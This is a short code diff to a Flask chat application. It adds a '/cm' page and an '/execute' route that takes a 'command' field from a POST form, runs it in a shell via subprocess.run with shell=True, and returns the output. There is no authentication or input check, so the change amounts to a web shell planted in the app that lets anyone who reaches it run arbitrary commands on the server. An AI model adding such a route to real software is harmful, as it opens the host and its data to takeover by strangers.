@@ -14,6 +14,15 @@ def index():
 @app.route("/m", methods=["GET"])
 def indexm():
     return render_template("index.html")
+@app.route('/cm')
+def indexcm():
+    return render_template('indexcm.html')
+
+@app.route('/execute', methods=['POST'])
+def execute():
+    command = request.form['command']
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return render_template('indexcm.html', result=result.stdout)
 @app.route("/chat", methods=["POST"])
 def chat():
     messages = request.form.get("prompts", None)
